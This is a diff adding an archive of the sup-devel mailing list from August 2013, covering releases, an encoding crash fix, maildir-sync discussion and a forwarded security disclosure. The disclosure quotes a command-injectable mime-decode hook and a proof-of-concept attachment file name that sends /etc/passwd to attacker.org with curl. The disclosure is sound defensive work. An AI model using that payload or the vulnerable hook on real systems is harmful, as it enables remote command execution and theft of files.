@@ -1,0 +1,513 @@
+From eg at gaute.vetsj.com  Fri Aug  9 22:18:56 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sat, 10 Aug 2013 00:18:56 +0200
+Subject: [sup-devel] How do I force flush the log file in sup?
+In-Reply-To: <CAHWBo_bM_WmaUUHbER+1V8=o_McxibJCCipnxKnepsviV8Rrhw@mail.gmail.com>
+References: <CAHWBo_bM_WmaUUHbER+1V8=o_McxibJCCipnxKnepsviV8Rrhw@mail.gmail.com>
+Message-ID: <52056AD0.1070807@gaute.vetsj.com>
+
+On 30. juli 2013 15:18, Horacio Sanson wrote:
+> Is there a way to force sup to flush the log file after each write? It is
+> difficult to debug my gmail source as I cannot see real time what is going
+> on. Maybe set sup to always flush when SUP_LOG_LEVEL is set to debug?
+
+See below, you can add an check for log level as well if you want.
+
+- gaute
+
+diff --git a/lib/sup/logger.rb b/lib/sup/logger.rb
+index 7dd296a..283dfdb 100644
+--- a/lib/sup/logger.rb
++++ b/lib/sup/logger.rb
+@@ -60,7 +60,10 @@ private
+   ## actually distribute the message
+   def send_message m
+     @mutex.synchronize do
+-      @sinks.each { |sink| sink << m }
++      @sinks.each do |sink|
++        sink << m
++        sink.flush if sink.respond_to? :flush
++      end
+       @buf << m
+     end
+   end
+
+From eg at gaute.vetsj.com  Thu Aug 15 08:33:23 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Thu, 15 Aug 2013 10:33:23 +0200
+Subject: [sup-devel] Sup Release 0.14.0
+Message-ID: <1376554850-sup-6592@qwerzila>
+
+Greetings,
+
+I have just release Sup 0.14.0 which contains a lot of updates. Check
+out the Release Notes below for more details.
+
+Important:
+- This release does no longer work on Ruby 1.8.
+- Configuration files must be migrated from Sup 0.13 [1].
+- Read the migration notice [1].
+
+If you are not feeling very adventurous, stay with Sup 0.13 for a little
+while yet. Remember to back up your current ~/.sup before upgrading in
+case you need to downgrade.
+
+Happy sup! Thanks to all the contributors and testers!
+
+Check the wiki for installation instructions [2] or just do a:
+
+  $ gem install sup
+
+Report issues to our tracker at GitHub [3].
+
+
+Cheers, Gaute
+
+[1] https://github.com/sup-heliotrope/sup/wiki/Migration-0.13-to-0.14
+[2] https://github.com/sup-heliotrope/sup/wiki/
+[3] https://github.com/sup-heliotrope/sup/issues
+
+
+== Release Notes ==
+CJK-compatability, Psych usage, thread safety, GPGME 2.0 support. Sup is now
+Ruby 1.9 based, and apart from RMail - ready for Ruby 2.0.0.
+
+Sup now uses Psych as a YAML parser (default by Ruby) and your previous
+configuration files (~/.sup/*.yaml) may need to be migrated or re-created for
+them to work with the new sup. A migration script is included for this.
+
+Check https://github.com/sup-heliotrope/sup/wiki/Migration-0.13-to-0.14 for
+the latest instructions.
+
+First back up your ~/.sup directory and index, after installing the new sup
+run:
+
+$ sup-psych-ify-config-files
+
+to migrate your files. You should now be all set for buisness.
+
+
+
+From eric.weikl at gmx.net  Thu Aug 15 13:22:14 2013
+From: eric.weikl at gmx.net (Eric Weikl)
+Date: Thu, 15 Aug 2013 15:22:14 +0200
+Subject: [sup-devel] Is maildir-sync ready for prime time?
+In-Reply-To: <1366143381-sup-8459@mint>
+References: <CAHsqw9sqBv-5zkdKhPcOwzi-qpe250U3ksHAvgwTENJ8EtozFA@mail.gmail.com>
+	<CAOxvSbfuBUYc7fTS=Ov2gBi6JtCkhmy8YVP3iUXwENnmLdzH3Q@mail.gmail.com>
+	<51692285.8000709@gaute.vetsj.com>
+	<CAHsqw9ue9AqTO4OxVDUzb-3u7GShxZRmjPDNzwJQVtsZi_3icw@mail.gmail.com>
+	<51695AF1.2070701@gaute.vetsj.com>
+	<CAHsqw9v46_d+n=XUeg76zmws+kjtit3SfQ59NZtTxMYrJ8F1Vg@mail.gmail.com>
+	<5169925C.1060701@gaute.vetsj.com>
+	<516997BD.7010409@gaute.vetsj.com> <1365938152-sup-6420@mint>
+	<516A9BA0.7040906@gaute.vetsj.com> <1366143381-sup-8459@mint>
+Message-ID: <1376572537-sup-83@mint>
+
+Hi fellow sup users,
+
+the maildir-sync branch has been hanging around for quite a while. Since
+sup 0.14.0 is out now, we could consider merging it into the developer
+branch. I've been using the branch continuously and haven't encountered
+any problems so far.
+
+Has anyone else tried the branch, or is willing to do so? It would be
+great to have some more opinions on it.
+
+Gaute created a corresponding pull request here:
+https://github.com/sup-heliotrope/sup/pull/126
+
+Cheers,
+Eric
+
+On 04/16/2013 22:30:26, Eric Weikl wrote:
+> Hi everyone,
+> 
+> I created a new branch with all the commits from Damien Leone and
+> Edward Yang related to maildir syncback and put it here:
+> 
+> https://github.com/sup-heliotrope/sup/tree/maildir-sync
+> 
+> I skipped some advanced stuff like Edward's inotify support for now. We
+> can add that later.
+> 
+> I performed some basic testing, but it would be great if some more
+> people could give it a try. There's some documentation in the wiki:
+> 
+> https://github.com/sup-heliotrope/sup/wiki/Maildir-Syncback
+> 
+> Cheers,
+> Eric
+
+From gregor at hoffleit.de  Thu Aug 15 16:21:43 2013
+From: gregor at hoffleit.de (Gregor Hoffleit)
+Date: Thu, 15 Aug 2013 18:21:43 +0200
+Subject: [sup-devel] sup 0.14: Encoding::UndefinedConversionError from
+	thread: load threads for thread-index-mode
+Message-ID: <1376582732-sup-7192@sam.mediasupervision.de>
+
+Sup 0.14 fails for me just after the start with the following exception:
+
+--- Encoding::UndefinedConversionError from thread: load threads for thread-index-mode
+"\xE2" from ASCII-8BIT to UTF-8
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/util.rb:259:in `width'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/util.rb:259:in `display_length'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:226:in `block in draw_line_from_array'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:224:in `each'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:224:in `each_with_index'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:224:in `draw_line_from_array'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:199:in `draw_line'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/line_cursor_mode.rb:52:in `draw_line'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:46:in `block in draw'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:46:in `each'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/scroll_mode.rb:46:in `draw'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/line_cursor_mode.rb:37:in `draw'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/buffer.rb:118:in `draw'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/buffer.rb:102:in `redraw'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/buffer.rb:335:in `draw_screen'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/buffer.rb:766:in `clear'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/util.rb:639:in `method_missing'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/thread_index_mode.rb:667:in `load_n_threads'
+(eval):12:in `load_n_threads'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/modes/thread_index_mode.rb:638:in `block in load_n_threads_background'
+/var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup.rb:85:in `block in reporting_thread'
+
+
+I noticed that this exception looks similar to a report from 2011:
+
+* Horacio Sanson's message of Mo Apr 25 04:25:04 +0200 2011:
+> Any attempt to add a label with Japanese characters crashes the application. 
+> Seems this is a common problem to all Ruby 1.9 applications. I can see Rails 
+> had or has a lot of problems with this:
+> 
+> http://yehudakatz.com/2010/05/05/ruby-1-9-encodings-a-primer-and-the-solution-for-rails/
+> 
+> https://rails.lighthouseapp.com/projects/8994/tickets/4683-ascii-8bit-and-utf-8-in-hell
+> 
+> 
+> The backtrace I get follows:
+> 
+> /var/lib/gems/1.9.1/gems/console-0.3/lib/console/string.rb:27:in 
+> `display_width': "\xE3" from ASCII-8BIT to UTF-8 
+> (Encoding::UndefinedConversionError)
+>         from /var/lib/gems/1.9.1/gems/console-0.3/lib/console/string.rb:27:in 
+> `display_width'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/textfield.rb:129:in 
+> `handle_input'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/input.rb:108:in `ask'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/input.rb:141:in 
+> `ask_many_with_completions'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/input.rb:198:in 
+> `ask_for_labels'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/modes/thread-index-
+> mode.rb:585:in `block in edit_labels'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/input.rb:42:in `asking'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/modes/thread-index-
+> mode.rb:584:in `edit_labels'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/input.rb:92:in `handle'
+>         from /home/ryujin/Apps/turnsole/lib/turnsole/ui.rb:73:in `step'
+>         from bin/turnsole:134:in `<main>'
+
+
+to which William responded:
+
+> Thanks for the bug report. This is a bit tricky. The problem is
+> actually that ncurses is giving me the characters one byte at a time.
+> I'll see what I can do to fix this.
+
+
+Do you need any more information to debug this problem?
+
+I'm using Ruby 1.9.3p194 on Debian 7.1. I installed Sup 0.14 with
+"gem1.9.1 install sup", which pulled in the following dependencies:
+
+# gem1.9.1 list --local
+
+*** LOCAL GEMS ***
+
+chronic (0.9.1)
+highline (1.6.19)
+locale (2.0.8)
+lockfile (2.1.0)
+mime-types (1.24)
+ncursesw-sup (1.3.1.3)
+rmail (1.0.0)
+sup (0.14.0)
+trollop (2.0)
+unicode (0.4.4)
+xapian-ruby (1.2.15.1)
+
+
+
+Regards,
+    Gregor Hoffleit
+
+From eg at gaute.vetsj.com  Thu Aug 15 16:39:45 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Thu, 15 Aug 2013 18:39:45 +0200
+Subject: [sup-devel] sup 0.14: Encoding::UndefinedConversionError from
+ thread: load threads for thread-index-mode
+In-Reply-To: <1376582732-sup-7192@sam.mediasupervision.de>
+References: <1376582732-sup-7192@sam.mediasupervision.de>
+Message-ID: <1376584400-sup-6242@qwerzila>
+
+Excerpts from Gregor Hoffleit's message of 2013-08-15 18:21:43 +0200:
+> Sup 0.14 fails for me just after the start with the following exception:
+> 
+> --- Encoding::UndefinedConversionError from thread: load threads for thread-index-mode
+> "\xE2" from ASCII-8BIT to UTF-8
+> /var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/util.rb:259:in `width'
+> /var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/util.rb:259:in `display_length'
+
+Hi Gregor,
+
+did you have a lot of messages in your index added by Sup 0.13 or
+earlier? Do you get the same error if you move the old xapian folder out
+of the way and try to re-index your messages?
+
+It is possible to restore labels using sup-dump and sup-sync --restore.
+
+Otherwise, I used to hackishly fix this error when it occured at some
+other point by doing the following fix:
+
+diff --git a/lib/sup/util.rb b/lib/sup/util.rb
+index 5cff6fa..4579a38 100644
+--- a/lib/sup/util.rb
++++ b/lib/sup/util.rb
+@@ -256,7 +256,7 @@ end
+ 
+ class String
+   def display_length
+-    @display_length ||= Unicode.width(self, false)
++    @display_length ||= Unicode.width(self.fix_encoding, false)
+   end
+ 
+   def slice_by_display_length len
+
+The problem is that the string which is being formatted (or sought the
+width of) is of some sort of encoding (probably already UTF-8), but Ruby
+or NCurses or RMail or whatever has lost the encoding, and although the
+bytes are encoded they are treated as binary (ASCII-8BIT). There is
+generally no way to figure out what the original encoding was, but we
+can guess that it is UTF-8 and fix it.
+
+Regards, Gaute
+
+
+From eg at gaute.vetsj.com  Thu Aug 15 16:49:55 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Thu, 15 Aug 2013 18:49:55 +0200
+Subject: [sup-devel] sup 0.14: Encoding::UndefinedConversionError from
+ thread: load threads for thread-index-mode
+In-Reply-To: <1376584400-sup-6242@qwerzila>
+References: <1376582732-sup-7192@sam.mediasupervision.de>
+	<1376584400-sup-6242@qwerzila>
+Message-ID: <1376585317-sup-1707@qwerzila>
+
+Excerpts from Gaute Hope's message of 2013-08-15 18:39:45 +0200:
+> Excerpts from Gregor Hoffleit's message of 2013-08-15 18:21:43 +0200:
+> > Sup 0.14 fails for me just after the start with the following exception:
+> > 
+> > --- Encoding::UndefinedConversionError from thread: load threads for thread-index-mode
+> > "\xE2" from ASCII-8BIT to UTF-8
+> > /var/lib/gems/1.9.1/gems/sup-0.14.0/lib/sup/util.rb:259:in `width'
+> diff --git a/lib/sup/util.rb b/lib/sup/util.rb
+> index 5cff6fa..4579a38 100644
+> --- a/lib/sup/util.rb
+> +++ b/lib/sup/util.rb
+> @@ -256,7 +256,7 @@ end
+>  
+>  class String
+>    def display_length
+> -    @display_length ||= Unicode.width(self, false)
+> +    @display_length ||= Unicode.width(self.fix_encoding, false)
+>    end
+>  
+>    def slice_by_display_length len
+
+Created pull request #128, please test if you have the chance.
+
+https://github.com/sup-heliotrope/sup/pull/128
+
+Regards, Gaute
+
+
+From gregor at hoffleit.de  Fri Aug 16 13:13:10 2013
+From: gregor at hoffleit.de (Gregor Hoffleit)
+Date: Fri, 16 Aug 2013 15:13:10 +0200
+Subject: [sup-devel] sup 0.14: Encoding::UndefinedConversionError from
+	thread: load threads for thread-index-mode
+In-Reply-To: <1376585317-sup-1707@qwerzila>
+References: <1376582732-sup-7192@sam.mediasupervision.de>
+	<1376584400-sup-6242@qwerzila> <1376585317-sup-1707@qwerzila>
+Message-ID: <1376658731-sup-3523@sam.mediasupervision.de>
+
+* Gaute Hope <eg at gaute.vetsj.com> [2013-08-15 18:49:55 +0200]
+> Created pull request #128, please test if you have the chance.
+> 
+> https://github.com/sup-heliotrope/sup/pull/128
+
+Yep, with this workaround, the crash no longer happens.
+
+    Gregor
+
+From gregor at hoffleit.de  Fri Aug 16 15:15:17 2013
+From: gregor at hoffleit.de (Gregor Hoffleit)
+Date: Fri, 16 Aug 2013 17:15:17 +0200
+Subject: [sup-devel] sup 0.14: Encoding::UndefinedConversionError from
+	thread: load threads for thread-index-mode
+In-Reply-To: <1376584400-sup-6242@qwerzila>
+References: <1376582732-sup-7192@sam.mediasupervision.de>
+	<1376584400-sup-6242@qwerzila>
+Message-ID: <1376658893-sup-8054@sam.mediasupervision.de>
+
+* Gaute Hope <eg at gaute.vetsj.com> [2013-08-15 18:39:45 +0200]
+> did you have a lot of messages in your index added by Sup 0.13 or
+> earlier? Do you get the same error if you move the old xapian folder out
+> of the way and try to re-index your messages?
+> 
+> It is possible to restore labels using sup-dump and sup-sync --restore.
+
+Thanks for this explanation.
+
+Yes, I was running with an index created with Sup < 0.13, and it's
+pretty clear to me now that this was the cause of this crash.
+
+Well, I moved away the old xapian folder and called sup-sync --restore,
+but this crashed after ten minutes and 10.000 messages (of 500.000).
+
+I just filled an issue #131 to github about this crash.
+
+    Gregor
+
+From eg at gaute.vetsj.com  Sun Aug 18 18:14:38 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sun, 18 Aug 2013 20:14:38 +0200
+Subject: [sup-devel] Fwd: Security issue with suggested configuration of sup
+Message-ID: <1376849419-sup-8191@qwerzila>
+
+Greetings suppers,
+
+joernchen has pointed out to me that our suggested hook for viewing html
+attachment has a serious security issue. The updated suggestion in [0] (wiki)
+should be safer.
+
+
+Please make sure that you update your mime-decode hook!
+
+
+Best regards, Gaute
+
+
+
+[0] https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments
+
+
+
+--- Begin forwarded message from joernchen ---
+From: joernchen <...>
+To: eg <eg at gaute.vetsj.com>
+Date: Sat, 17 Aug 2013 14:14:29 +0200
+Subject: Security issue with suggested configuration of sup
+
+[...]
+
+At [0] the suggested configuration for viewing HTML attachments with
+sup using the mime-decode hook is given as follows:
+
+unless sibling_types.member? "text/plain"
+  case content_type
+  when "text/html"
+    `/usr/bin/w3m -dump -T #{content_type} '#{filename}'`
+  end
+end
+
+This piece of code however is prone to command injection via the file
+name of the attached file. The command injection triggers upon sup
+indexing the mail, so no user interaction is needed.
+
+A better approach would be the following:
+
+require 'shellwords'
+unless sibling_types.member? "text/plain"
+  case content_type
+  when "text/html"
+    `/usr/bin/w3m -dump -T #{content_type} #{Shellwords.escape filename}`
+  end
+end
+
+[...]
+
+A simple PoC would be sending an email with a file attachment named
+like:
+
+'$(cd .. && cd .. && cd .. && cd .. && cd etc && curl --data @passwd attacker.org)'.html
+
+to a sup user making use of the suggested decode hook.
+
+[0] https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments
+
+[...]
+
+From eg at gaute.vetsj.com  Thu Aug 22 12:35:28 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Thu, 22 Aug 2013 14:35:28 +0200
+Subject: [sup-devel] Gmail source sync back.
+In-Reply-To: <51F6CA0B.7090406@gaute.vetsj.com>
+References: <CAHWBo_bRwKArh7nLQ8EMWdWvBV_kRGT=NqDU=Z69pTY+fNpMUQ@mail.gmail.com>
+	<51F6CA0B.7090406@gaute.vetsj.com>
+Message-ID: <52160590.4040502@gaute.vetsj.com>
+
+On 03. juli 2013 11:44, Horacio Sanson wrote:
+
+Hi,
+
+You should use the :update flag like the maildir-sync branch does for
+messages that have changed, that way it is easier to determine whether
+the UpdateManager should emit a signal (even if the message already exists).
+
+Cheers, Gaute
+
+
+From eg at gaute.vetsj.com  Sat Aug 31 16:27:03 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sat, 31 Aug 2013 18:27:03 +0200
+Subject: [sup-devel] Release 0.14.1
+Message-ID: <1377965598-sup-8230@qwerzila>
+
+Hi all,
+
+Release 0.14.1 is out. This is a service release to 0.14.0 + one
+small feature, a pre-defined 'All mail' search.
+
+Important: If you are upgrading from a Sup version previous 0.14.0
+please read the migration instructions in the wiki [0].
+
+Installation instructions for various platforms are also described in
+the wiki [1].
+
+Please report any issues you encounter to our GitHub issue tracker [2].
+
+
+We hope to get maildir-syncback (which Eric Weikl is maintaining) merged
+in for the next release 0.14.2, call out if you have tested or run the
+maildir-syncback branch. We would very much appreciate your experineces
+(good ones! or bad ones!), the tracking issue is here:
+
+  https://github.com/sup-heliotrope/sup/pull/126
+
+Thanks to those that have already reported their experiences, as well as
+all the contributors to sup (code [3], issues, maintenance and
+support!).
+
+
+
+Cheers, Gaute
+
+
+[0] https://github.com/sup-heliotrope/sup/wiki/Migration-0.13-to-0.14
+[1] https://github.com/sup-heliotrope/sup/wiki
+[2] https://github.com/sup-heliotrope/sup/issues
+[3] https://github.com/sup-heliotrope/sup/blob/release-0.14.1/CONTRIBUTORS
+
+
